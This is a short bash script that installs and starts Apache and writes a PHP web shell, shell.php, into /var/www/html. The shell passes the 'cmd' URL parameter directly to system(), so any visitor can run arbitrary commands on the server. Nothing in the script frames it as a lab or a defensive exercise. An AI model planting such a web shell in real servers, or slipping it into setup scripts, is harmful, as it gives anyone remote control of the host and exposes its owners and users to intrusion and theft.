#!/bin/bash
apt update
apt install -y apache2
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
systemctl enable apache2
systemctl start apache2

